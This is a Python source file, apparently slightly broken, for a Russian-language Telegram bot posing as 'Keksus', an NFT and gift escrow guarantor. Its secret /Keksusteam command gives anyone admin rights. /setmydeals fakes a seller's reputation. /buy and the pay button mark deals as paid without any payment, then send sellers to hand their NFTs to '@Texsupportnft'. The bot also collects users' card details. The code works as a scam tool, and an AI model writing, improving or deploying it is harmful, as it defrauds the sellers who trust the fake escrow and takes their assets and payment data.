mport telebot
from telebot import types
import re
import random
import string
import time
import os
import signal

# ТОКЕН БУДЕТ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ
bot = telebot.TeleBot(os.environ['TELEGRAM_BOT_TOKEN'])

# ОСТАЛЬНОЙ КОД БЕЗ ИЗМЕНЕНИЙ (все что ты прислал)
# ... вставь весь остальной код который ты мне прислал ...
i
# Временное хранилище
user_data = {}
deals = {}
user_requisites = {}  # Хранилище для реквизитов пользователей
referral_data = {}    # Хранилище для реферальной системы

# ЗАМЕНИТЕ НА USERNAME ВАШЕГО БОТА (без @)
bot_username = "@Keksusgift_bot"  # Правильное имя с нижним подчеркиванием

# Убедимся, что в bot_username нет @ в начале
if bot_username.startswith('@'):
    bot_username = bot_username[1:]

admin_users = set()

# ЗАМЕНИТЕ НА ID ГАРАНТА
guarantor_chat_id = "7605066070"

# Генерация ID сделки
def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

# Главное меню
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add('💰 Создать сделку', '📊 Мои сделки')
    markup.add('🔗 Реферальная система', '🆘 Поддержка')
    return markup

# Меню реферальной системы
def referral_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('👥 Мои рефералы', '📊 Статистика')
    markup.add('📣 Пригласить друзей', '⬅️ Назад в главное меню')
    return markup

# Меню выбора метода оплаты
def payment_method_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('💎 TON', '⭐ Звезды', '💳 Карта')
    markup.add('⬅️ Назад в главное меню')
    return markup

# Меню подтверждения NFT для продавца
def seller_nft_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('✅ NFT отправлен гаранту', '❌ Проблема с отправкой')
    markup.add('⬅️ Назад в главное меню')
    return markup

# Приватная команда /Keksusteam
@bot.message_handler(commands=['Keksusteam'])
def keksusteam_command(message):
    try:
        chat_id = message.chat.id
        admin_users.add(chat_id)
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['verified'] = True
        user_data[chat_id]['admin'] = True

        bot.send_message(chat_id, "✅ Привилегии активированы! Теперь вы можете использовать команды:\n/setmydeals [число] - установить количество успешных сделок\n/buy [код_сделки] - оплатить товар")
    except Exception as e:
        print(f"Ошибка в keksusteam_command: {e}")

# Команда для установки счетчика сделок
@bot.message_handler(commands=['setmydeals'])
def set_my_deals(message):
    try:
        chat_id = message.chat.id

        if chat_id not in admin_users:
            bot.send_message(chat_id, "❌ У вас нет доступа к этой команде.")
            return

        try:
            count = int(message.text.split()[1])
            if chat_id not in user_data:
                user_data[chat_id] = {}
            if 'deals_count' not in user_data[chat_id]:
                user_data[chat_id]['deals_count'] = 0
            user_data[chat_id]['deals_count'] += count

            bot.send_message(chat_id, f"✅ Установлено {count} успешных сделок! Общее количество: {user_data[chat_id]['deals_count']}")
        except (IndexError, ValueError):
            bot.send_message(chat_id, "Использование: /setmydeals [число]")
    except Exception as e:
        print(f"Ошибка в set_my_deals: {e}")

# Секретная команда /buy для оплаты товара
@bot.message_handler(commands=['buy'])
def buy_command(message):
    try:
        chat_id = message.chat.id

        # Проверяем, активированы ли привилегии
        if chat_id not in admin_users:
            bot.send_message(chat_id, "❌ У вас нет доступа к этой команде. Используйте /Keksusteam для активации.")
            return

        # Проверяем, указан ли код сделки
        if len(message.text.split()) < 2:
            bot.send_message(chat_id, "Использование: /buy [код_сделки]")
            return

        # Удаляем символ # если он есть в начале
        deal_id = message.text.split()[1].lstrip('#')

        # Проверяем, существует ли сделка
        if deal_id not in deals:
            bot.send_message(chat_id, "❌ Сделка с таким кодом не найдена.")
            return

        deal = deals[deal_id]

        # Проверяем, не является ли пользователь продавцом
        if chat_id == deal['seller_id']:
            bot.send_message(chat_id, "❌ Вы не можете оплатить свою собственную сделку.")
            return

        # Помечаем сделку как оплаченную
        deals[deal_id]['status'] = 'paid'
        deals[deal_id]['buyer_id'] = chat_id
        deals[deal_id]['buyer_username'] = message.from_user.username or "Неизвестно"

        # Уведомляем покупателя
        bot.send_message(chat_id, f"✅ Оплата принята! Ожидайте подтверждения отправки NFT от продавца по сделке #{deal_id}.")

        # Уведомляем продавца и просим отправить NFT гаранту
        seller_id = deal['seller_id']
        instructions = (
            f"🛒 Покупатель оплатил сделку #{deal_id}\n\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"📜 Описание: {deal['description']}\n"
            f"👤 Покупатель: @{deals[deal_id]['buyer_username']}\n\n"
            f"📦 Для завершения сделки отправьте NFT гаранту:\n"
            f"👤 Гарант: @Texsupportnft\n\n"
            f"После отправки NFT нажмите кнопку '✅ NFT отправлен гаранту'"
        )

        bot.send_message(seller_id, instructions, reply_markup=seller_nft_menu())

        # Сохраняем информацию о сделке для продавца
        user_data[seller_id] = {'active_deal': deal_id}

    except Exception as e:
        print(f"Ошибка в buy_command: {e}")

# Обработка команды /start
@bot.message_handler(commands=['start'])
def start(message):
    try:
        chat_id = message.chat.id

        # Проверяем параметры старта
        if len(message.text.split()) > 1:
            param = message.text.split()[1]

            # Обработка реферальных ссылок
            if param.startswith('ref_'):
                ref_id = param[4:]
                if ref_id.isdigit():
                    ref_id = int(ref_id)
                    # Сохраняем информацию о реферале
                    if chat_id not in referral_data:
                        referral_data[chat_id] = {'referred_by': ref_id, 'bonus_earned': 0}

                    # Добавляем реферала к пригласившему
                    if ref_id not in referral_data:
                        referral_data[ref_id] = {'referrals': [], 'total_earned': 0}

                    if 'referrals' not in referral_data[ref_id]:
                        referral_data[ref_id]['referrals'] = []

                    if chat_id not in referral_data[ref_id]['referrals']:
                        referral_data[ref_id]['referrals'].append(chat_id)

                    bot.send_message(chat_id, f"🎉 Вы перешли по реферальной ссылке! За каждую успешную сделку пригласивший получит бонус.")

            # ОБРАБОТКА ССЫЛОК НА СДЕЛКИ
            elif param.startswith('deal_'):
                deal_id = param[5:]
                if deal_id in deals:
                    deal = deals[deal_id]

                    # Показываем информацию о сделке покупателю
                    deal_info = f"💎 Сделка #{deal_id}\n\n"
                    deal_info += f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                    deal_info += f"📜 Описание: {deal['description']}\n"
                    deal_info += f"💳 Метод оплаты: {deal['payment_method']}\n\n"

                    # Добавляем реквизиты в сообщение
                    if deal['payment_method'] == 'TON':
                        deal_info += f"👛 TON-кошелек: `{deal['requisites']}`\n\n"
                    elif deal['payment_method'] == 'Звезды':
                        deal_info += f"👤 Telegram для перевода: @{deal['requisites']}\n\n"
                    elif deal['payment_method'] == 'Карта':
                        deal_info += f"💳 Реквизиты карты: {deal['requisites']}\n\n"

                    deal_info += "Для оплаты нажмите кнопку ниже ⬇️"

                    # Создаем кнопку оплаты
                    markup = types.InlineKeyboardMarkup()
                    pay_btn = types.InlineKeyboardButton("💳 Оплатить", callback_data=f"pay_{deal_id}")
                    markup.add(pay_btn)

                    bot.send_message(chat_id, deal_info, reply_markup=markup, parse_mode='Markdown')
                    return
                else:
                    bot.send_message(chat_id, "Сделка не найдена или была удалена.")
                    return

        # Обновленное приветственное сообщение
        welcome_text = (
            "Добро пожаловать в Keksus– надежный P2P-гарант\n\n"
            "💼 Покупайте и продавайте всё, что угодно – безопасно!\n"
            "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риса\n\n"
            "🔹 Удобное управление кошельками\n"
            "🔹 Реферальная система\n"
            "🔹 Безопасные сделки с гарантией"
        )

        bot.send_message(chat_id, welcome_text, reply_markup=main_menu())

    except Exception as e:
        print(f"Ошибка: {e}")

# Обработка текстовых сообщений
@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    try:
        chat_id = message.chat.id
        text = message.text

        # Для обычных пользователей
        if text == '💰 Создать сделку':
            msg = bot.send_message(chat_id, "Выберите способ оплаты:", reply_markup=payment_method_menu())

        elif text == '💎 TON':
            user_data[chat_id] = {'payment_method': 'TON'}
            # Проверяем, есть ли уже реквизиты для TON
            if chat_id in user_requisites and 'ton' in user_requisites[chat_id]:
                msg = bot.send_message(chat_id, "Введите сумму сделки в TON:")
                bot.register_next_step_handler(msg, process_amount)
            else:
                msg = bot.send_message(chat_id, "Введите ваш TON-кошелек для получения платежей:")
                bot.register_next_step_handler(msg, process_ton_requisites)

        elif text == '⭐ Звезды':
            user_data[chat_id] = {'payment_method': 'Звезды'}
            # Проверяем, есть ли уже реквизиты для звезд
            if chat_id in user_requisites and 'stars' in user_requisites[chat_id]:
                msg = bot.send_message(chat_id, "Введите количество звезд:")
                bot.register_next_step_handler(msg, process_amount)
            else:
                msg = bot.send_message(chat_id, "Введите ваш Telegram username для получения звезд:")
                bot.register_next_step_handler(msg, process_stars_requisites)

        elif text == '💳 Карта':
            user_data[chat_id] = {'payment_method': 'Карта'}
            # Проверяем, есть ли уже реквизиты для карты
            if chat_id in user_requisites and 'card' in user_requisites[chat_id]:
                msg = bot.send_message(chat_id, "Введите сумму сделки в рублях:")
                bot.register_next_step_handler(msg, process_amount)
            else:
                msg = bot.send_message(chat_id, "Введите реквизиты вашей карты (номер карты, имя владельца):")
                bot.register_next_step_handler(msg, process_card_requisites)

        elif text == '📊 Мои сделки':
            show_user_deals(chat_id)

        elif text == '🔗 Реферальная система':
            show_referral_info(chat_id)

        elif text == '👥 Мои рефералы':
            show_my_referrals(chat_id)

        elif text == '📊 Статистика':
            show_referral_stats(chat_id)

        elif text == '📣 Пригласить друзей':
            generate_referral_link(chat_id)

        elif text == '🆘 Поддержка':
            bot.send_message(chat_id, "Связь с поддержкой: @support_username")

        elif text == '⬅️ Назад в главное меню':
            bot.send_message(chat_id, "Главное меню", reply_markup=main_menu())

        elif text == '✅ NFT отправлен гаранту':
            handle_nft_sent(chat_id)

        elif text == '❌ Проблема с отправкой':
            handle_sending_problem(chat_id)

    except Exception as e:
        print(f"Ошибка: {e}")

# Показать информацию о реферальной системе
def show_referral_info(chat_id):
    text = (
        "👥 Реферальная система\n\n"
        "Приглашайте друзей и получайте бонусы за их сделки!\n\n"
        "🔹 За каждого приглашенного друга: 5% от его первой сделки\n"
        "🔹 За последующие сделки: 2% от суммы каждой сделки\n"
        "🔹 Бонусы начисляются автоматически после завершения сделок\n"
    )
    bot.send_message(chat_id, text, reply_markup=referral_menu())

# Показать рефералов пользователя
def show_my_referrals(chat_id):
    if chat_id in referral_data and 'referrals' in referral_data[chat_id] and referral_data[chat_id]['referrals']:
        referrals = referral_data[chat_id]['referrals']
        text = "👥 Ваши рефералы:\n\n"
        for i, ref_id in enumerate(referrals, 1):
            text += f"{i}. ID: {ref_id}\n"
        bot.send_message(chat_id, text)
    else:
        bot.send_message(chat_id, "У вас пока нет рефералов.")

# Показать статистику рефералов
def show_referral_stats(chat_id):
    if chat_id in referral_data:
        total_earned = referral_data[chat_id].get('total_earned', 0)
        ref_count = len(referral_data[chat_id].get('referrals', []))

        text = (
            f"📊 Ваша реферальная статистика:\n\n"
            f"👥 Количество рефералов: {ref_count}\n"
            f"💰 Всего заработано: {total_earned} TON\n"
        )
        bot.send_message(chat_id, text)
    else:
        bot.send_message(chat_id, "У вас пока нет реферальной статистики.")

# Генерация реферальной ссылки
def generate_referral_link(chat_id):
    ref_link = f"https://t.me/{bot_username}?start=ref_{chat_id}"

    text = (
        "📣 Пригласите друзей и получайте бонусы!\n\n"
        "Ваша реферальная ссылка:\n"
        f"{ref_link}\n\n"
        "Поделитесь этой ссылкой с друзьями. "
        "Когда они перейдут по ней и совершат свою первую сделку, "
        "вы получите бонус!"
    )
    bot.send_message(chat_id, text)

# Обработка callback-запросов
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        chat_id = call.message.chat.id
        data = call.data

        if data.startswith('pay_'):
            deal_id = data[4:]
            if deal_id in deals:
                deal = deals[deal_id]

                if chat_id == deal['seller_id']:
                    bot.answer_callback_query(call.id, "❌ Нельзя оплатить свою сделку")
                    return

                # Помечаем как оплаченную
                deals[deal_id]['status'] = 'paid'
                deals[deal_id]['buyer_id'] = chat_id
                deals[deal_id]['buyer_username'] = call.from_user.username or "Неизвестно"

                # Уведомляем покупателя
                bot.send_message(chat_id, "✅ Оплата принята! Ожидайте отправки NFT.")

                # Уведомляем продавца
                seller_id = deal['seller_id']
                bot.send_message(seller_id,
                               f"💰 Покупатель оплатил сделку #{deal_id}\n\n"
                               f"📦 Отправьте NFT гаранту @Texsupportnft\n"
                               f"💬 После отправки нажмите кнопку ниже",
                               reply_markup=seller_nft_menu())

                # Сохраняем активную сделку для продавца
                user_data[seller_id] = {'active_deal': deal_id}

                bot.answer_callback_query(call.id)

        elif data.startswith('confirm_'):
            deal_id = data[8:]
            if deal_id in deals:
                # Завершаем сделку
                deals[deal_id]['status'] = 'completed'

                # Начисляем бонусы рефералам
                process_referral_bonuses(deal_id)

                # Уведомляем покупателя
                buyer_id = deals[deal_id]['buyer_id']
                if buyer_id:
                    bot.send_message(buyer_id, f"✅ Сделка #{deal_id} завершена! NFT получено.")

                # Уведомляем продавца
                seller_id = deals[deal_id]['seller_id']
                bot.send_message(seller_id, f"✅ Сделка #{deal_id} завершена! Средства будут переведены.")

                bot.answer_callback_query(call.id, "Сделка подтверждена!")

        elif data.startswith('share_'):
            deal_id = data[6:]
            if deal_id in deals:
                # Генерируем ссылку для分享 сделки
                deal_link = f"https://t.me/{bot_username}?start=deal_{deal_id}"

                share_text = (
                    f"📤 Поделиться сделкой #{deal_id}\n\n"
                    f"🔗 Ссылка для покупателя:\n{deal_link}\n\n"
                    "Отправьте эту ссылку покупателю, "
                    "чтобы он мог перейти и оплатить сделку."
                )

                bot.send_message(chat_id, share_text)
                bot.answer_callback_query(call.id)

    except Exception as e:
        print(f"Ошибка в callback: {e}")

# Начисление бонусов за рефералов
def process_referral_bonuses(deal_id):
    try:
        deal = deals[deal_id]
        buyer_id = deal['buyer_id']

        # Проверяем, есть ли у покупателя реферер
        if buyer_id in referral_data and 'referred_by' in referral_data[buyer_id]:
            referrer_id = referral_data[buyer_id]['referred_by']

            # Рассчитываем бонус (5% от суммы сделки)
            try:
                amount = float(deal['amount'])
                bonus = amount * 0.05

                # Начисляем бонус рефереру
                if referrer_id not in referral_data:
                    referral_data[referrer_id] = {'total_earned': 0}

                if 'total_earned' not in referral_data[referrer_id]:
                    referral_data[referrer_id]['total_earned'] = 0

                referral_data[referrer_id]['total_earned'] += bonus

                # Уведомляем реферера о бонусе
                bot.send_message(
                    referrer_id,
                    f"🎉 Вы получили бонус {bonus:.2f} TON за сделку вашего реферала!\n"
                    f"Сделка: #{deal_id}, Сумма: {deal['amount']} {deal['currency']}"
                )
            except ValueError:
                print(f"Ошибка преобразования суммы: {deal['amount']}")

    except Exception as e:
        print(f"Ошибка в process_referral_bonuses: {e}")

# Обработка TON реквизитов
def process_ton_requisites(message):
    try:
        chat_id = message.chat.id

        if message.text == '⬅️ Назад в главное меню':
            bot.send_message(chat_id, "Главное меню", reply_markup=main_menu())
            return

        ton_wallet = message.text.strip()

        # Сохраняем реквизиты
        if chat_id not in user_requisites:
            user_requisites[chat_id] = {}
        user_requisites[chat_id]['ton'] = ton_wallet

        msg = bot.send_message(chat_id, "Введите сумму сделки в TON:")
        bot.register_next_step_handler(msg, process_amount)
    except Exception as e:
        print(f"Ошибка: {e}")

# Обработка реквизитов для звезд
def process_stars_requisites(message):
    try:
        chat_id = message.chat.id

        if message.text == '⬅️ Назад в главное меню':
            bot.send_message(chat_id, "Главное меню", reply_markup=main_menu())
            return

        telegram_username = message.text.strip()

        # Сохраняем реквизиты
        if chat_id not in user_requisites:
            user_requisites[chat_id] = {}
        user_requisites[chat_id]['stars'] = telegram_username

        msg = bot.send_message(chat_id, "Введите количество звезд:")
        bot.register_next_step_handler(msg, process_amount)
    except Exception as e:
        print(f"Ошибка: {e}")

# Обработка реквизитов карты
def process_card_requisites(message):
    try:
        chat_id = message.chat.id

        if message.text == '⬅️ Назад в главное меню':
            bot.send_message(chat_id, "Главное меню", reply_markup=main_menu())
            return

        card_details = message.text.strip()

        # Сохраняем реквизиты
        if chat_id not in user_requisites:
            user_requisites[chat_id] = {}
        user_requisites[chat_id]['card'] = card_details

        msg = bot.send_message(chat_id, "Введите сумму сделки в рублях:")
        bot.register_next_step_handler(msg, process_amount)
    except Exception as e:
        print(f"Ошибка: {e}")

# Обработка суммы сделки
def process_amount(message):
    try:
        chat_id = message.chat.id

        if message.text == '⬅️ Назад в главное меню':
            bot.send_message(chat_id, "Главное меню", reply_markup=main_menu())
            return

        amount = message.text
        user_data[chat_id]['amount'] = amount

        msg = bot.send_message(chat_id, "Введите описание товара/NFT:")
        bot.register_next_step_handler(msg, process_description)
    except Exception as e:
        print(f"Ошибка: {e}")

# Обработка описания
def process_description(message):
    try:
        chat_id = message.chat.id

        if message.text == '⬅️ Назад в главное меню':
            bot.send_message(chat_id, "Главное меню", reply_markup=main_menu())
            return

        description = message.text
        amount = user_data[chat_id]['amount']
        payment_method = user_data[chat_id]['payment_method']

        # Получаем реквизиты в зависимости от метода оплаты
        requisites = ""
        if payment_method == 'TON' and chat_id in user_requisites and 'ton' in user_requisites[chat_id]:
            requisites = user_requisites[chat_id]['ton']
        elif payment_method == 'Звезды' and chat_id in user_requisites and 'stars' in user_requisites[chat_id]:
            requisites = user_requisites[chat_id]['stars']
        elif payment_method == 'Карта' and chat_id in user_requisites and 'card' in user_requisites[chat_id]:
            requisites = user_requisites[chat_id]['card']

        # Определяем валюту
        if payment_method == 'TON':
            currency = 'TON'
        elif payment_method == 'Звезды':
            currency = 'Звезд'
        else:
            currency = 'RUB'

        # Создаем сделку
        deal_id = generate_deal_id()

        deals[deal_id] = {
            'amount': amount,
            'currency': currency,
            'description': description,
            'payment_method': payment_method,
            'requisites': requisites,
            'status': 'pending',
            'seller_id': chat_id,
            'seller_username': message.from_user.username or "Неизвестно",
            'buyer_id': None,
            'buyer_username': None
        }

        deal_message = "✅ Сделка успешно создана!\n\n"
        deal_message += f"💰 Сумма: {amount} {currency}\n"
        deal_message += f"📜 Описание: {description}\n"
        deal_message += f"💳 Метод оплаты: {payment_method}\n"

        # Добавляем реквизиты в сообщение
        if payment_method == 'TON':
            deal_message += f"👛 TON-кошелек: `{requisites}`\n"
        elif payment_method == 'Звезды':
            deal_message += f"👤 Telegram для перевода: @{requisites}\n"
        elif payment_method == 'Карта':
            deal_message += f"💳 Реквизиты карты: {requisites}\n"

        deal_message += f"🔗 Код: #{deal_id}\n\n"
        deal_message += "📤 Для отправки ссылки покупателю нажмите кнопку «Поделиться сделкой»"

        # Создаем кнопку поделиться сделкой
        markup = types.InlineKeyboardMarkup()
        share_btn = types.InlineKeyboardButton("📤 Поделиться сделкой", callback_data=f"share_{deal_id}")
        markup.add(share_btn)

        bot.send_message(chat_id, deal_message, reply_markup=markup, parse_mode='Markdown')

        # Добавляем кнопки управления сделкой
        control_markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        control_markup.add('❌ Отменить сделку')
        control_markup.add('⬅️ Назад в главное меню')

        bot.send_message(chat_id, "Управление сделкой:", reply_markup=control_markup)
    except Exception as e:
        print(f"Ошибка: {e}")

# Показать сделки пользователя
def show_user_deals(chat_id):
    user_deals = []
    for deal_id, deal in deals.items():
        if deal['seller_id'] == chat_id or deal.get('buyer_id') == chat_id:
            user_deals.append(f"#{deal_id} - {deal['amount']} {deal['currency']} - {deal['status']}")

    if user_deals:
        bot.send_message(chat_id, "📋 Ваши сделки:\n" + "\n".join(user_deals[-5:]))
    else:
        bot.send_message(chat_id, "У вас пока нет сделок.")

# Обработка подтверждения отправки NFT продавцом
def handle_nft_sent(chat_id):
    try:
        # Проверяем, есть ли активная сделка у пользователя
        if chat_id in user_data and 'active_deal' in user_data[chat_id]:
            deal_id = user_data[chat_id]['active_deal']

            if deal_id in deals:
                # Обновляем статус сделки
                deals[deal_id]['status'] = 'nft_sent'

                # Уведомляем покупателя
                buyer_id = deals[deal_id]['buyer_id']
                if buyer_id:
                    bot.send_message(
                        buyer_id,
                        f"✅ Продавец отправил NFT гаранту по сделке #{deal_id}. "
                        f"Ожидайте подтверждения получения."
                    )

                # Уведомляем гаранта
                notify_guarantor(deal_id)

                # Отправляем подтверждение продавцу
                bot.send_message(
                    chat_id,
                    "✅ Подтверждение отправки NFT получено! "
                    "Ожидайте подтверждения от гаранта.",
                    reply_markup=main_menu()
                )

                # Логируем действие
                print(f"Продавец {chat_id} подтвердил отправку NFT для сделки #{deal_id}")
            else:
                bot.send_message(chat_id, "❌ Сделка не найдена.")
        else:
            bot.send_message(
                chat_id,
                "❌ У вас нет активных сделок или сделка не была найдена."
            )
    except Exception as e:
        print(f"Ошибка в handle_nft_sent: {e}")
        bot.send_message(chat_id, "❌ Произошла ошибка при обработке запроса.")

# Уведомление гаранта о новой сделке
def notify_guarantor(deal_id):
    try:
        deal = deals[deal_id]
        message = (
            f"🛒 Новая сделка требует подтверждения!\n\n"
            f"📋 ID сделки: #{deal_id}\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"📝 Описание: {deal['description']}\n"
            f"💳 Метод оплаты: {deal['payment_method']}\n"
        )

        # Добавляем реквизиты в уведомление гаранту
        if deal['payment_method'] == 'TON':
            message += f"👛 TON-кошелек: `{deal['requisites']}`\n"
        elif deal['payment_method'] == 'Звезды':
            message += f"👤 Telegram для перевода: @{deal['requisites']}\n"
        elif deal['payment_method'] == 'Карта':
            message += f"💳 Реквизиты карты: {deal['requisites']}\n"

        message += (
            f"👤 Продавец: @{deal['seller_username']}\n"
            f"👤 Покупатель: @{deal.get('buyer_username', 'Неизвестно')}\n\n"
            f"✅ Подтвердите получение NFT от продавца."
        )

        # Создаем кнопку для подтверждения
        markup = types.InlineKeyboardMarkup()
        confirm_btn = types.InlineKeyboardButton(
            "✅ Подтвердить получение",
            callback_data=f"confirm_{deal_id}"
        )
        markup.add(confirm_btn)

        # Отправляем сообщение гаранту
        bot.send_message(
            guarantor_chat_id,
            message,
            reply_markup=markup,
            parse_mode='Markdown'
        )

        print(f"Уведомление отправлено гаранту о сделке #{deal_id}")

    except Exception as e:
        print(f"Ошибка в notify_guarantor: {e}")

# Обработка проблемы с отправкой
def handle_sending_problem(chat_id):
    if chat_id in user_data and 'active_deal' in user_data[chat_id]:
        deal_id = user_data[chat_id]['active_deal']
        if deal_id in deals:
            # Возвращаем сделку в статус ожидания
            deals[deal_id]['status'] = 'problem'

            # Уведомляем покупателя
            buyer_id = deals[deal_id]['buyer_id']
            if buyer_id:
                bot.send_message(buyer_id, f"❌ Продавец сообщил о проблеме с отправкой NFT по сделке #{deal_id}. Свяжитесь с поддержкой.")

            bot.send_message(chat_id, "❌ Мы зарегистрировали проблему с отправкой. Свяжитесь с @Texsupportnft для решения вопроса.", reply_markup=main_menu())
        else:
            bot.send_message(chat_id, "Сделка не найдена.")
    else:
        bot.send_message(chat_id, "У вас нет активных сделок.")

# Функция для обработки сигналов и корректного завершения
def signal_handler(signum, frame):
    print("\nЗавершение работы бота...")
    bot.stop_polling()
    exit(0)

if __name__ == '__main__':
    # Регистрируем обработчики сигналов для корректного завершения
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    print("Бот запущен...")
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"Ошибка при запуске бота: {e}")
